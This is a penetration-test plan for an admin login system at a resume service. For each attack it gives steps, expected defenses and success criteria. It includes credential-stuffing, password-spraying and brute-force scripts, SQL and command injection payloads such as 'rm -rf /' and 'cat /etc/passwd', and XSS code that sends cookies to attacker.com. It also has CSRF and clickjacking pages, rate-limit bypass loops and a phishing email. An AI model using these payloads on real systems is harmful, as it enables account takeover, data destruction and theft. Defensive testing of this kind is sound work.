# PENETRATION TEST SCENARIOS

**Project:** Southwest Resume Services - Admin Authentication System
**Version:** 1.0
**Last Updated:** December 22, 2025
**Purpose:** Offensive security testing scenarios and attack simulations

---

## DISCLAIMER

These scenarios are for **authorized penetration testing only**. Unauthorized testing is illegal. Only perform these tests on:
- Development/staging environments
- Production with explicit written authorization
- During scheduled penetration test windows

---

## TABLE OF CONTENTS

1. [Authentication Attack Scenarios](#1-authentication-attack-scenarios)
2. [Authorization Attack Scenarios](#2-authorization-attack-scenarios)
3. [Session Attack Scenarios](#3-session-attack-scenarios)
4. [Injection Attack Scenarios](#4-injection-attack-scenarios)
5. [API Security Attack Scenarios](#5-api-security-attack-scenarios)
6. [Client-Side Attack Scenarios](#6-client-side-attack-scenarios)
7. [Infrastructure Attack Scenarios](#7-infrastructure-attack-scenarios)
8. [Social Engineering Scenarios](#8-social-engineering-scenarios)

---

## 1. AUTHENTICATION ATTACK SCENARIOS

### 1.1 Credential Stuffing Attack

**Objective:** Test defenses against credential reuse attacks

**Attack Scenario:**
Attacker has obtained credential pairs from breaches of other websites and attempts to login with those credentials.

**Attack Steps:**
1. Obtain credential list (simulated):
```
user1@email.com:Password123
user2@email.com:Welcome2023
user3@email.com:Qwerty123!
[... 10,000 more entries]
```

2. Write attack script:
```python
# credential_stuffing.py
import requests
import time
from itertools import islice

def credential_stuffing_attack(credentials_file, target_url):
    session = requests.Session()
    successful_logins = []

    with open(credentials_file, 'r') as f:
        for line in f:
            email, password = line.strip().split(':')

            response = session.post(
                f"{target_url}/api/admin/auth/login",
                json={"email": email, "password": password},
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                print(f"[+] SUCCESS: {email}:{password}")
                successful_logins.append((email, password))
            elif response.status_code == 429:
                print(f"[!] Rate limited. Waiting...")
                time.sleep(900)  # 15 minutes
            else:
                print(f"[-] Failed: {email}")

            time.sleep(1)  # Slow down to avoid rate limit

    return successful_logins

# Execute
attack("credentials.txt", "https://southwestresumes.com")
```

3. Monitor rate limiting behavior
4. Attempt to bypass using proxy rotation

**Expected Defenses:**
- ✅ Account-based rate limiting blocks attack after 10 attempts per email
- ✅ IP-based rate limiting slows down attack
- ✅ Account lockout after 20 failed attempts
- ✅ All attempts logged in security audit log
- ✅ Alert triggered after threshold

**Success Criteria:**
- Attack fails to compromise any accounts
- Rate limiting effectively slows attack
- Security team notified within 5 minutes
- All attempts logged with IP addresses

---

### 1.2 Password Spraying Attack

**Objective:** Test defenses against common password attempts

**Attack Scenario:**
Attacker uses common passwords against many user accounts.

**Attack Steps:**
1. Common password list:
```
Password123
Welcome2024
Company123
Admin123!
Spring2024
```

2. User enumeration (attempt to discover valid emails):
```bash
# Test login timing differences
for email in emails.txt; do
  time curl -X POST https://southwestresumes.com/api/admin/auth/login \
    -d "{\"email\":\"$email\",\"password\":\"wrong\"}" \
    -H "Content-Type: application/json"
done
```

3. Password spraying script:
```python
# password_spray.py
def password_spray(users, passwords, target):
    for password in passwords:
        print(f"[*] Trying password: {password}")

        for user in users:
            response = requests.post(
                f"{target}/api/admin/auth/login",
                json={"email": user, "password": password},
                headers={"Content-Type: application/json"}
            )

            if response.status_code == 200:
                print(f"[+] FOUND: {user}:{password}")
                return (user, password)

            time.sleep(5)  # Slow spraying to avoid detection

        # Wait between password attempts
        time.sleep(3600)  # 1 hour between passwords

# Execute
users = ["admin@sw.com", "ryan@sw.com", "support@sw.com"]
passwords = ["Password123", "Welcome2024", "Admin123!"]
password_spray(users, passwords, "https://southwestresumes.com")
```

**Expected Defenses:**
- ✅ Timing attack prevention (constant response time)
- ✅ No user enumeration via error messages
- ✅ Account lockout triggers before successful guess
- ✅ Anomaly detection flags suspicious pattern
- ✅ Email notifications sent to users under attack

**Success Criteria:**
- No user enumeration possible
- Attack detected and blocked
- Zero successful authentications
- Incident response triggered

---

### 1.3 Brute Force Password Attack

**Objective:** Test password complexity enforcement

**Attack Scenario:**
Attacker attempts all possible passwords for a known admin account.

**Attack Steps:**
1. Generate password candidates:
```python
# brute_force.py
import itertools
import string

def generate_passwords(length=8):
    chars = string.ascii_lowercase + string.digits
    for pwd in itertools.product(chars, repeat=length):
        yield ''.join(pwd)

def brute_force_attack(email, target):
    for password in generate_passwords():
        response = requests.post(
            f"{target}/api/admin/auth/login",
            json={"email": email, "password": password}
        )

        if response.status_code == 200:
            print(f"[+] CRACKED: {password}")
            return password
        elif response.status_code == 429:
            time.sleep(900)

# This will take approximately 10^14 years at 1 req/sec
brute_force_attack("admin@sw.com", "https://southwestresumes.com")
```

**Expected Defenses:**
- ✅ Rate limiting makes brute force infeasible
- ✅ Account lockout after 20 attempts
- ✅ Password complexity requirements increase search space
- ✅ bcrypt slows down verification
- ✅ Mathematical impossibility (36^8 = 2.8 trillion combinations)

**Success Criteria:**
- Attack abandoned due to rate limiting
- Account locked before success
- Time to crack exceeds heat death of universe

---

### 1.4 Session Token Brute Force

**Objective:** Test session token randomness

**Attack Scenario:**
Attacker attempts to guess valid session tokens.

**Attack Steps:**
1. Token format analysis:
```bash
# Capture legitimate token
sb-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0...

# Analyze structure (JWT)
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"1234567890"}
# Signature: HMAC-SHA256 hash
```

2. Brute force attempt:
```python
# token_brute_force.py
def guess_jwt_secret(sample_token):
    # Common JWT secrets
    common_secrets = [
        "secret", "jwt_secret", "your-256-bit-secret",
        "mysecretkey", "password", "123456"
    ]

    for secret in common_secrets:
        if verify_jwt(sample_token, secret):
            print(f"[+] JWT secret found: {secret}")
            return secret

    # Brute force 6-character alphanumeric
    for secret in generate_alphanumeric(6):
        if verify_jwt(sample_token, secret):
            print(f"[+] JWT secret found: {secret}")
            return secret
```

**Expected Defenses:**
- ✅ Supabase uses strong JWT secrets (256-bit minimum)
- ✅ Secret stored in environment variables (not in code)
- ✅ Secret rotation policy
- ✅ Token signature verification prevents tampering

**Success Criteria:**
- JWT secret cannot be brute forced
- Token tampering detected
- No valid tokens generated

---

## 2. AUTHORIZATION ATTACK SCENARIOS

### 2.1 Privilege Escalation via Direct API Call

**Objective:** Test authorization enforcement in API

**Attack Scenario:**
Viewer role attempts to perform admin actions by calling API directly.

**Attack Steps:**
1. Login as viewer:
```bash
# Get viewer token
curl -X POST https://southwestresumes.com/api/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"viewer@test.com","password":"[password]"}' \
  -c viewer_cookies.txt
```

2. Attempt admin actions:
```bash
# Try to delete questionnaire (requires delete_questionnaires permission)
curl -X DELETE https://southwestresumes.com/api/admin/questionnaires/123 \
  -b viewer_cookies.txt

# Try to create user (requires manage_users permission)
curl -X POST https://southwestresumes.com/api/admin/users \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com","role":"super_admin"}' \
  -b viewer_cookies.txt

# Try to edit settings (requires edit_settings permission)
curl -X PUT https://southwestresumes.com/api/admin/settings \
  -H "Content-Type: application/json" \
  -d '{"admin_email":"hacker@evil.com"}' \
  -b viewer_cookies.txt
```

**Expected Defenses:**
- ✅ All requests return 403 Forbidden
- ✅ Permission middleware blocks unauthorized actions
- ✅ No database changes occur
- ✅ All attempts logged in audit log
- ✅ Alert triggered for privilege escalation attempt

**Success Criteria:**
- Zero unauthorized operations succeed
- Appropriate error messages returned
- Viewer session not terminated (continues to work for allowed actions)

---

### 2.2 Horizontal Privilege Escalation

**Objective:** Test user data isolation

**Attack Scenario:**
Admin user A attempts to access admin user B's data.

**Attack Steps:**
1. Login as Admin A and get their user ID
2. Discover Admin B's user ID (via enumeration or leaked data)
3. Attempt to access Admin B's resources:

```bash
# Get Admin A's sessions
curl https://southwestresumes.com/api/admin/users/[admin-a-id]/sessions \
  -b admin_a_cookies.txt
# Expected: 200 OK

# Try to get Admin B's sessions
curl https://southwestresumes.com/api/admin/users/[admin-b-id]/sessions \
  -b admin_a_cookies.txt
# Expected: 403 Forbidden

# Try to update Admin B's profile
curl -X PUT https://southwestresumes.com/api/admin/users/[admin-b-id] \
  -H "Content-Type: application/json" \
  -d '{"role":"viewer"}' \
  -b admin_a_cookies.txt
# Expected: 403 Forbidden (only super_admin can modify users)
```

**Expected Defenses:**
- ✅ User can only access their own data
- ✅ Only super_admin can access other users
- ✅ Database RLS policies enforce isolation
- ✅ API validates user ownership

**Success Criteria:**
- Cross-user access denied
- Own data accessible
- Super admin can access all data (as designed)

---

### 2.3 IDOR (Insecure Direct Object Reference)

**Objective:** Test object reference authorization

**Attack Scenario:**
Attacker manipulates ID parameters to access unauthorized resources.

**Attack Steps:**
1. Login and access own client:
```bash
# Legitimate request
curl https://southwestresumes.com/api/admin/clients/5 \
  -b cookies.txt
# Returns client 5 data (owned by attacker)
```

2. Enumerate other client IDs:
```bash
# Try sequential IDs
for id in {1..100}; do
  curl https://southwestresumes.com/api/admin/clients/$id \
    -b cookies.txt \
    -w "ID $id: %{http_code}\n" \
    -o /dev/null -s
done

# Check for 200 responses (unauthorized access)
```

3. Attempt to access/modify other clients:
```bash
# Read
curl https://southwestresumes.com/api/admin/clients/1 \
  -b cookies.txt

# Update
curl -X PUT https://southwestresumes.com/api/admin/clients/1 \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com"}' \
  -b cookies.txt

# Delete
curl -X DELETE https://southwestresumes.com/api/admin/clients/1 \
  -b cookies.txt
```

**Expected Defenses:**
- ✅ Admin can view all clients (by design - not IDOR)
- ✅ Authorization checked before modification
- ✅ Database RLS policies prevent unauthorized access
- ✅ User permissions validated for each action

**Success Criteria:**
- Authorized access works
- Unauthorized modifications blocked
- No data leakage

---

### 2.4 Parameter Tampering

**Objective:** Test input validation and authorization

**Attack Scenario:**
Attacker modifies request parameters to escalate privileges.

**Attack Steps:**
1. Intercept profile update request:
```http
PUT /api/admin/users/123 HTTP/1.1
Content-Type: application/json

{
  "full_name": "John Doe",
  "role": "viewer"
}
```

2. Tamper with role parameter:
```json
{
  "full_name": "John Doe",
  "role": "super_admin"  // ← Escalation attempt
}
```

3. Other tampering attempts:
```json
// Add admin flag
{
  "full_name": "John Doe",
  "is_admin": true,
  "permissions": ["*"]
}

// Inject user_id
{
  "user_id": "00000000-0000-0000-0000-000000000000",  // Admin UUID
  "full_name": "Hacker"
}
```

**Expected Defenses:**
- ✅ Only super_admin can change roles
- ✅ user_id cannot be modified
- ✅ Unexpected fields ignored or rejected
- ✅ Input validation prevents injection

**Success Criteria:**
- Role changes require super_admin
- Unauthorized parameters ignored
- No privilege escalation

---

## 3. SESSION ATTACK SCENARIOS

### 3.1 Session Hijacking via XSS

**Objective:** Test XSS protection and HttpOnly cookies

**Attack Scenario:**
Attacker injects XSS to steal session cookies.

**Attack Steps:**
1. Find XSS vulnerability (should not exist):
```html
<!-- Attempt stored XSS in client name -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Attempt reflected XSS in search -->
<img src=x onerror="
  fetch('https://attacker.com?c=' + document.cookie)
">
```

2. If XSS succeeds, attempt cookie theft:
```javascript
// Payload executed in victim's browser
const cookies = document.cookie;
const tokens = {
  accessToken: getCookie('sb-access-token'),
  refreshToken: getCookie('sb-refresh-token')
};

// Send to attacker
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(tokens)
});
```

**Expected Defenses:**
- ✅ XSS payload sanitized/encoded
- ✅ HttpOnly cookies not accessible via JavaScript
- ✅ CSP blocks unauthorized requests
- ✅ No cookies sent to attacker

**Success Criteria:**
- XSS injection fails
- document.cookie returns empty or non-sensitive data
- HttpOnly cookies protected
- CSP violations logged

---

### 3.2 Session Fixation Attack

**Objective:** Test session regeneration on login

**Attack Scenario:**
Attacker sets victim's session ID before authentication.

**Attack Steps:**
1. Attacker visits login page, gets session ID
2. Attacker sends malicious link to victim:
```
https://southwestresumes.com/admin/login?session=ATTACKER_SESSION_ID
```

3. Victim logs in using link
4. Attacker uses pre-set session ID to access victim's account

**Expected Defenses:**
- ✅ Session ID regenerated on login
- ✅ Session parameter in URL ignored
- ✅ New random session token generated
- ✅ Old session invalidated

**Test:**
```bash
# Step 1: Get a session token (pre-auth)
PRE_AUTH_SESSION=$(curl -c - https://southwestresumes.com/admin/login | grep sb-access-token)

# Step 2: Login
curl -X POST https://southwestresumes.com/api/admin/auth/login \
  -d '{"email":"victim@test.com","password":"[password]"}' \
  -c post_auth_cookies.txt

# Step 3: Check if session changed
POST_AUTH_SESSION=$(grep sb-access-token post_auth_cookies.txt)

# Compare sessions
if [ "$PRE_AUTH_SESSION" == "$POST_AUTH_SESSION" ]; then
  echo "[!] VULNERABLE: Session not regenerated"
else
  echo "[+] SECURE: Session regenerated on login"
fi
```

**Success Criteria:**
- Session always regenerated on login
- Pre-auth sessions cannot be used post-auth
- Session fixation impossible

---

### 3.3 CSRF Attack on Session Management

**Objective:** Test CSRF protection on logout and session revocation

**Attack Scenario:**
Attacker tricks victim into revoking their own sessions.

**Attack Steps:**
1. Create malicious page:
```html
<!-- attacker.com/logout-trap.html -->
<body onload="document.forms[0].submit()">
  <form action="https://southwestresumes.com/api/admin/logout" method="POST">
    <!-- Auto-submits when victim visits page -->
  </form>
</body>
```

2. Send link to victim (while they're logged in)
3. When victim visits, they're logged out

**Expected Defenses:**
- ✅ CSRF middleware blocks cross-origin requests
- ✅ Origin header validated
- ✅ SameSite cookies prevent automatic submission
- ✅ Logout requires valid origin

**Test:**
```bash
# Simulate CSRF from different origin
curl -X POST https://southwestresumes.com/api/admin/logout \
  -H "Origin: https://attacker.com" \
  -H "Referer: https://attacker.com/page.html" \
  -b legitimate_cookies.txt

# Expected: 403 Forbidden
```

**Success Criteria:**
- Cross-origin logout blocked
- User not logged out from malicious page
- CSRF attempt logged

---

### 3.4 Session Replay Attack

**Objective:** Test session binding and timeout

**Attack Scenario:**
Attacker captures and replays valid session token.

**Attack Steps:**
1. Intercept legitimate request (MITM, network sniffing):
```http
GET /api/admin/stats HTTP/1.1
Host: southwestresumes.com
Cookie: sb-access-token=eyJhbGc...
```

2. Replay from different location:
```bash
# Attacker in different country/ISP
curl https://southwestresumes.com/api/admin/stats \
  -H "Cookie: sb-access-token=eyJhbGc..." \
  -H "User-Agent: DifferentBrowser/1.0"
```

3. Continue using after victim logs out

**Expected Defenses:**
- ✅ Session binding validates IP/User-Agent
- ✅ Suspicious changes trigger re-auth
- ✅ Token expiration enforced
- ✅ Logout invalidates all tokens

**Test:**
```bash
# Login from IP A, User Agent X
curl -X POST https://southwestresumes.com/api/admin/auth/login \
  -d '{"email":"test@test.com","password":"[password]"}' \
  -H "User-Agent: Chrome/90" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -c cookies.txt

# Use token from IP B, User Agent Y
curl https://southwestresumes.com/api/admin/stats \
  -H "User-Agent: Firefox/80" \
  -H "X-Forwarded-For: 5.6.7.8" \
  -b cookies.txt

# Expected: 403 or re-authentication required
```

**Success Criteria:**
- Replay from different context blocked/flagged
- User notified of suspicious activity
- Session binding effective

---

## 4. INJECTION ATTACK SCENARIOS

### 4.1 SQL Injection Attack

**Objective:** Test SQL injection protection

**Attack Scenario:**
Attacker attempts SQL injection in various input fields.

**Attack Vectors:**

**1. Login Form:**
```bash
# Classic SQL injection
curl -X POST https://southwestresumes.com/api/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com'\'' OR '\''1'\''='\''1","password":"anything"}'

# Time-based blind SQL injection
curl -X POST https://southwestresumes.com/api/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com'\'' AND SLEEP(5)--","password":"x"}'

# Union-based injection
curl -X POST https://southwestresumes.com/api/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"x'\'' UNION SELECT NULL,NULL,NULL--","password":"x"}'
```

**2. Search/Filter Fields:**
```bash
# Client search
curl "https://southwestresumes.com/api/admin/clients?search=x' OR '1'='1" \
  -b cookies.txt

# Questionnaire filter
curl "https://southwestresumes.com/api/admin/questionnaires?status=active'; DROP TABLE questionnaires;--" \
  -b cookies.txt
```

**3. Data Modification:**
```bash
# Client creation
curl -X POST https://southwestresumes.com/api/admin/clients \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","name":"x'\'; DROP TABLE admin_users;--"}' \
  -b cookies.txt
```

**Expected Defenses:**
- ✅ Parameterized queries (Supabase prevents injection)
- ✅ Input validation rejects malicious input
- ✅ ORM/Query builder prevents raw SQL
- ✅ No SQL errors returned to client
- ✅ Generic error messages only

**Success Criteria:**
- Zero successful SQL injection
- No database errors leaked
- All attempts return generic 400/401 errors
- Database integrity maintained

---

### 4.2 NoSQL Injection (Supabase Edge Cases)

**Objective:** Test JSON-based query injection

**Attack Scenario:**
Attacker attempts to manipulate JSON queries.

**Attack Steps:**
```bash
# JSONB operator injection
curl https://southwestresumes.com/api/admin/clients \
  -H "Content-Type: application/json" \
  -d '{"filter":{"metadata":{"$ne":null}}}' \
  -b cookies.txt

# PostgreSQL function injection
curl https://southwestresumes.com/api/admin/clients?id=1;SELECT%20pg_sleep(10)-- \
  -b cookies.txt
```

**Expected Defenses:**
- ✅ Supabase validates all queries
- ✅ Malformed JSON rejected
- ✅ Function calls not executed
- ✅ Type validation enforced

---

### 4.3 Command Injection

**Objective:** Test OS command execution protection

**Attack Scenario:**
Attacker attempts to execute system commands.

**Attack Vectors:**
```bash
# File upload name injection (if file upload exists)
curl -X POST https://southwestresumes.com/api/admin/upload \
  -F "file=@test.pdf;filename=test.pdf;rm -rf /" \
  -b cookies.txt

# Email parameter injection
curl -X POST https://southwestresumes.com/api/admin/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com; cat /etc/passwd"}' \
  -b cookies.txt
```

**Expected Defenses:**
- ✅ No shell execution from user input
- ✅ Input sanitization
- ✅ File name validation
- ✅ Email address validation

**Success Criteria:**
- No command execution
- Malicious input rejected
- Server files not accessible

---

## 5. API SECURITY ATTACK SCENARIOS

### 5.1 API Rate Limit Bypass

**Objective:** Test rate limit evasion techniques

**Attack Scenario:**
Attacker attempts to bypass rate limiting.

**Bypass Techniques:**

**1. X-Forwarded-For Spoofing:**
```bash
for i in {1..100}; do
  curl -X POST https://southwestresumes.com/api/admin/auth/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
```

**2. Proxy Rotation:**
```python
# Use proxy list to rotate IPs
proxies = ['1.2.3.4:8080', '5.6.7.8:8080', ...]

for proxy in proxies:
    requests.post(
        "https://southwestresumes.com/api/admin/auth/login",
        json={"email": "test@test.com", "password": "wrong"},
        proxies={"https": proxy}
    )
```

**3. Distributed Attack (Botnet Simulation):**
```bash
# Simulate 1000 different IPs
for i in {1..1000}; do
  docker run --rm curlimages/curl \
    curl -X POST https://southwestresumes.com/api/admin/auth/login \
    -d '{"email":"test@test.com","password":"wrong"}' &
done
```

**Expected Defenses:**
- ✅ X-Forwarded-For validation against trusted proxies
- ✅ Fallback to connection IP if header untrusted
- ✅ Account-based rate limiting (not just IP)
- ✅ Distributed attack detection (anomaly detection)

**Success Criteria:**
- Header spoofing ineffective
- Account still locked after threshold
- Distributed attack detected and blocked
- WAF/CDN rate limiting activated

---

### 5.2 Mass Assignment Vulnerability

**Objective:** Test protection against unauthorized field modification

**Attack Scenario:**
Attacker adds unexpected fields to API requests.

**Attack Steps:**
```bash
# Normal user update
curl -X PUT https://southwestresumes.com/api/admin/users/123 \
  -H "Content-Type: application/json" \
  -d '{"full_name":"John Doe"}' \
  -b cookies.txt

# Mass assignment attack
curl -X PUT https://southwestresumes.com/api/admin/users/123 \
  -H "Content-Type: application/json" \
  -d '{
    "full_name":"John Doe",
    "role":"super_admin",
    "active":true,
    "user_id":"00000000-0000-0000-0000-000000000000",
    "created_at":"2020-01-01",
    "is_admin":true
  }' \
  -b cookies.txt
```

**Expected Defenses:**
- ✅ Whitelist of allowed fields
- ✅ Unexpected fields ignored or rejected
- ✅ Protected fields (role, user_id) not modifiable
- ✅ TypeScript type checking

**Success Criteria:**
- Only allowed fields updated
- Protected fields unchanged
- No privilege escalation
- Audit log shows attempted mass assignment

---

### 5.3 GraphQL Injection (If Applicable)

**Objective:** Test GraphQL security (if using GraphQL)

**Note:** Currently using REST API. Include if GraphQL added later.

---

## 6. CLIENT-SIDE ATTACK SCENARIOS

### 6.1 DOM-Based XSS

**Objective:** Test client-side XSS protection

**Attack Scenario:**
Attacker exploits client-side JavaScript to execute code.

**Attack Vectors:**
```javascript
// URL parameter injection
https://southwestresumes.com/admin?name=<img src=x onerror=alert(1)>

// Hash fragment exploitation
https://southwestresumes.com/admin#<script>alert(document.cookie)</script>

// postMessage exploitation
window.postMessage('<img src=x onerror=alert(1)>', '*');
```

**Test Cases:**
```javascript
// In browser console
// Test URL parameter handling
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('output').innerHTML = name;
// Expected: Sanitized output, no script execution

// Test hash handling
window.location.hash = '<script>alert(1)</script>';
// Expected: No script execution

// Test React rendering
const userInput = '<img src=x onerror=alert(1)>';
<div>{userInput}</div>
// Expected: Escaped as text, no HTML rendering
```

**Expected Defenses:**
- ✅ React auto-escapes content
- ✅ No dangerouslySetInnerHTML with user input
- ✅ URL parameters sanitized
- ✅ CSP blocks inline scripts

**Success Criteria:**
- No DOM XSS possible
- User input rendered as text
- CSP violations blocked

---

### 6.2 Clickjacking Attack

**Objective:** Test iframe protection

**Attack Scenario:**
Attacker embeds admin page in invisible iframe.

**Attack Page:**
```html
<!-- attacker.com/clickjack.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>Win a Free iPhone!</h1>
  <button>Click Here to Claim</button>

  <!-- Invisible iframe over button -->
  <iframe
    src="https://southwestresumes.com/admin/users/delete/123"
    style="position:absolute; top:100px; left:50px; opacity:0; width:200px; height:50px;"
  ></iframe>

  <!-- User thinks they're clicking the button, but they're actually clicking the delete button in the iframe -->
</body>
</html>
```

**Expected Defenses:**
- ✅ X-Frame-Options: DENY
- ✅ CSP frame-ancestors: 'none'
- ✅ Browser refuses to load iframe

**Test:**
```bash
# Check X-Frame-Options header
curl -I https://southwestresumes.com/admin

# Create test page and try to iframe
cat > clickjack_test.html <<EOF
<iframe src="https://southwestresumes.com/admin"></iframe>
EOF

# Open in browser - iframe should not load
```

**Success Criteria:**
- Iframe blocked by browser
- Console shows frame-ancestors error
- Admin page not embeddable

---

### 6.3 Client-Side Storage Attacks

**Objective:** Test sensitive data storage

**Attack Scenario:**
Attacker accesses localStorage/sessionStorage.

**Test:**
```javascript
// In browser console (while logged in)
console.log('localStorage:', localStorage);
console.log('sessionStorage:', sessionStorage);
console.log('IndexedDB:', await indexedDB.databases());

// Check for sensitive data
const keys = Object.keys(localStorage);
keys.forEach(key => {
  const value = localStorage.getItem(key);
  if (value.includes('token') || value.includes('password')) {
    console.log('SENSITIVE DATA:', key, value);
  }
});
```

**Expected Results:**
- ✅ No access tokens in localStorage
- ✅ No passwords in any client storage
- ✅ Tokens stored in HttpOnly cookies only
- ✅ Only non-sensitive data in localStorage (UI state, preferences)

**Success Criteria:**
- No tokens in accessible storage
- XSS cannot steal tokens
- Physical access doesn't expose tokens

---

## 7. INFRASTRUCTURE ATTACK SCENARIOS

### 7.1 Information Disclosure

**Objective:** Test information leakage

**Attack Steps:**
```bash
# Check for exposed files
curl https://southwestresumes.com/.git/config
curl https://southwestresumes.com/.env
curl https://southwestresumes.com/.env.local
curl https://southwestresumes.com/package.json
curl https://southwestresumes.com/.htaccess

# Check for directory listing
curl https://southwestresumes.com/api/
curl https://southwestresumes.com/uploads/

# Check error messages
curl https://southwestresumes.com/api/admin/nonexistent
curl https://southwestresumes.com/api/admin/clients/99999999

# Check headers for version info
curl -I https://southwestresumes.com/
```

**Expected Results:**
- ✅ 404 for all sensitive files
- ✅ No directory listing
- ✅ Generic error messages (production)
- ✅ No version info in headers

---

### 7.2 Subdomain Takeover

**Objective:** Test subdomain security

**Attack Steps:**
```bash
# Enumerate subdomains
curl https://crt.sh/?q=%.southwestresumes.com&output=json

# Check DNS records
dig southwestresumes.com ANY
dig admin.southwestresumes.com
dig api.southwestresumes.com

# Check for dangling CNAMEs
for subdomain in $(cat subdomains.txt); do
  host $subdomain.southwestresumes.com
done
```

**Expected Results:**
- ✅ All subdomains have valid records
- ✅ No dangling CNAMEs
- ✅ All subdomains actively used

---

### 7.3 DDoS Simulation

**Objective:** Test resilience to traffic floods

**Note:** Only perform with explicit authorization and traffic controls.

**Test Tools:**
- Apache Bench (ab)
- wrk
- Hey

**Test:**
```bash
# Low-volume sustained load
ab -n 10000 -c 100 https://southwestresumes.com/

# Burst traffic
hey -n 50000 -c 500 -q 1000 https://southwestresumes.com/
```

**Expected Results:**
- ✅ Rate limiting engages
- ✅ CDN/WAF absorbs load
- ✅ Auto-scaling handles legitimate traffic
- ✅ Service remains available

---

## 8. SOCIAL ENGINEERING SCENARIOS

### 8.1 Phishing Simulation

**Objective:** Test user awareness (with permission)

**Scenario:**
Send simulated phishing email to admins.

**Email:**
```
From: security@southwestresumes.com (spoofed)
Subject: URGENT: Verify your admin account

Your admin account will be suspended in 24 hours unless you verify.

Click here: https://southwestresumes.com.evil.com/admin/verify
                                      ↑ Note the extra domain

[Verify Account Button]
```

**Expected Results:**
- ✅ Users report phishing attempt
- ✅ Users don't click link
- ✅ SPF/DKIM/DMARC prevents spoofing
- ✅ Email filters catch phishing

---

## REPORTING TEMPLATE

After each penetration test, document findings:

```markdown
# Penetration Test Report

**Date:** [Date]
**Tester:** [Name]
**Scenario:** [Scenario Name]
**Environment:** [Production/Staging/Dev]

## Summary
Brief overview of test and findings.

## Vulnerabilities Found
| Severity | Issue | Impact | Evidence |
|----------|-------|--------|----------|
| Critical | [Issue] | [Impact] | [Screenshot/Log] |
| High | [Issue] | [Impact] | [Screenshot/Log] |

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]

## Evidence
[Screenshots, logs, commands]
```

---

**Document Version:** 1.0
**Last Updated:** December 22, 2025
**Next Review:** March 22, 2026
**Authorized Personnel Only**
